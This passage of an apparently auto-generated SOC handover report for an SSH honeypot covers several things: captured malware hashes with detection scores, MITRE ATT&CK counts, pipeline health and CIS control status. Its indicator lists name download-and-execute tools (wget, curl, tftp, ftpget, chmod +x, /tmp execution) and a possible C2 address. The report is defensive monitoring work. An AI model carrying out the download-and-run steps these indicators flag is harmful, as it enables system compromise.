| `155f0ec763ff3db0f48796e55d1401620dd739d66ab88a8dd78d8fae18cfc79f` | Shell Script | `155f0ec763ff3db0...` | 56/100 | 🟡 MEDIUM | **15/75** 🔴 |
| `16d3440fcc067823afc44dcbccea9fbbc2f8c68ae53b7aea45f9adff4c127086` | Bash Script | `16d3440fcc067823...` | 65/100 | 🟡 MEDIUM | **14/72** 🔴 |
| `183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` | Bash Script | `183fb8e38eeb1160...` | 81/100 | 🔴 HIGH | **28/75** 🔴 |
| `1858c51b58e913ca8d868ea94493ad1c74fad15ce283d94c10c22ceb3e92541d` | ELF Binary (Linux executable) (AArch64 64-bit) | `1858c51b58e913ca...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `197c74408e15bd1168105f564f96aace4fd4819961b724630bf5a6be4878daf8` | Bash Script | `197c74408e15bd11...` | 69/100 | 🟡 MEDIUM | **23/75** 🔴 |
| `1e70b63472772e3f5092ffe9c3573470e73590e6ab6d93fdcede1d368a5fd72d` | Bash Script | `1e70b63472772e3f...` | 60/100 | 🟡 MEDIUM | **27/75** 🔴 |
| `1e7c134cf160b486708c40c21f671cd6f53c7578a8047a4eb22f668476e0c4c4` | ELF Binary (Linux executable) (unknown (e_machine=0x102) 64-bit) | `1e7c134cf160b486...` | 54/100 | 🟡 MEDIUM | **35/75** 🔴 |
| `1ed8ba8b6936fd378c18a7aafeef6db8575f8ce679ab93ae7c1b36493f7bd65b` | ELF Binary (Linux executable) (MIPS 32-bit) | `1ed8ba8b6936fd37...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `1eecf2377d20768c28d741e21affaa53cf26db0d083efdbf43a92fa938b7e4be` | ELF Binary (Linux executable) (ARM 32-bit) | `1eecf2377d20768c...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `1ef0eb60318495dd0cb100fc828f28237d487b800605c7cc54155cf34582598b` | ELF Binary (Linux executable) (x86-64 64-bit) | `1ef0eb60318495dd...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `20260630-221457-3e8812e60d6c-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260630-221457-3e8812e60d6c-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144928-0dd2c2474d24-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260713-144929-0dd2c2474d24-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260719-133120-1bcffc78eeca-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260801-061430-edcaf401de58-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20230724T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_20600609T164419` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_MSMQ_poc` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `20260807-060110-c733cc2a6a9b-0-redir__home_uuid_1_00000000_0000_0000_0000_000000000000` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `21e99667e2f0e73d12aae89f8cabd338426ab1fe4ce828ec93c07de615ef754c` | ELF Binary (Linux executable) (AArch64 64-bit) | `21e99667e2f0e73d...` | 63/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `27d205dc183ea2fad0e55e10b206404be20908e39a74569ff99182d7326ed9c0` | ELF Binary (Linux executable) (x86-64 64-bit) | `27d205dc183ea2fa...` | 44/100 | 🟡 MEDIUM | **37/75** 🔴 |
| `287962211de7bcadb39f7576732438b43ee6aab420ec23c29a9d12a8151a547f` | ELF Binary (Linux executable) (x86 32-bit) | `287962211de7bcad...` | 42/100 | 🟡 MEDIUM | **32/75** 🔴 |
| `289fd4a7a10aaf8aa313ab80cc170018fc662d0a7d034a3b92b9d3d3945b0736` | ELF Binary (Linux executable) (x86-64 64-bit) | `289fd4a7a10aaf8a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `2a39d592018600e4b3db2caed6cdaa8c651d3dacbebf8ac1f0960e493843c435` | ELF Binary (Linux executable) (x86-64 64-bit) | `2a39d592018600e4...` | 46/100 | 🟡 MEDIUM | **40/75** 🔴 |
| `2bd2ab1d4b75aa2b4eed1af697188b8bce35a882faf4335cb4fafc2847197995` | ELF Binary (Linux executable) (unknown (e_machine=0x04) 32-bit) | `2bd2ab1d4b75aa2b...` | 53/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `2f206563640dd66a743ffd493ce0e3c31a8fc5a24b9f5d2b540fc22d45c13d66` | ELF Binary (Linux executable) (x86 32-bit) | `2f206563640dd66a...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |

**Suspicious Indicators — HIGH Severity Samples:**

_`09591253a95411d60c2b0d5384924aa7cafbceec1467c951c6bbb1655d748f0b` (09591253a95411d60c2b0d53...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `Execution from /tmp` — `/tmp/condi`
- `IP:Port (possible C2)` — `255.255.255[.]255:1900`

_`183fb8e38eeb1160f392f6d3c473752bc5b183a5c744f23a31dcc5ae2fda87f5` (183fb8e38eeb1160f392f6d3...)_
- `Download via wget` — `wget`
- `Download via curl` — `curl`
- `Download via TFTP` — `tftp`
- `Download via ftpget` — `ftpget`
- `chmod +x (make executable)` — `chmod +x`

---

## 🌐 Top Attacker IPs by Abuse Score

_No enriched IPs with abuse scores available._

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 271 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 261 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 4 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 4 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 3 |

---

## 🔕 False Positive Summary (2840 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 2840 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 2840 cases |
| Tool 34  | Credential Extractor        | ✅ 282 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 12 fingerprints |
| Tool 36  | Command Clustering          | ✅ 5 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 70 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 2840 filtered (100.0%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 57 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 49 files |
| Tool 33  | YARA Classifier             | ✅ 20 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 0 priority case(s) shown individually · 0 recon entry/entries in table (0 group(s) consolidating 0 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

## 🛡️ CIS Controls Snapshot

| Control | Name | Status | Evidence |
|---|---|---|---|
| CIS-1 | Asset Inventory | ACTIVE | assets.json updated every pipeline run by Tool 05 — covers VM2 directly and VM1 via SSH relay |
| CIS-2 | Software Inventory | MONITORING | data/tool_manifest.json auto-generated from pipeline.yml each run — tracks all active tools, languages, and I/O paths |
| CIS-3 | Data Protection | ACTIVE | R2 archive encrypted at rest — thirha-raw-archive |
| CIS-4 | Secure Configuration | ACTIVE | haproxy.cfg, cowrie.cfg, VCN rules in config/ |
| CIS-5 | Account Management | ACTIVE | Two key pairs, dedicated cowrie user, no shared credentials |
| CIS-6 | Access Control | ACTIVE | Pipeline key vs personal key separation, GitHub Secrets |
| CIS-7 | Vulnerability Management | MONITORING | Oracle security patches — pending regular cadence |
| CIS-8 | Audit Log Management | ACTIVE | cowrie.json + cowrie.log dual streams, 59-day corpus |
| CIS-9 | Email/Web Protection | PLANNED | cloudflared tunnels planned — direct IP exposure currently |
| CIS-10 | Malware Defence | ACTIVE | Tool 31 malware analysis + Tool 33 YARA classification |
| CIS-11 | Data Recovery | ACTIVE | R2 archive, EBS snapshots, runbook recovery procedures |
| CIS-12 | Network Infrastructure | ACTIVE | VCN private networking, HAProxy TCP LB, Cloudflare DNS |

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `Aegispub/thir-ha · Oracle Cloud HA_  
_Report time: 2026-08-17T22:29:44Z_
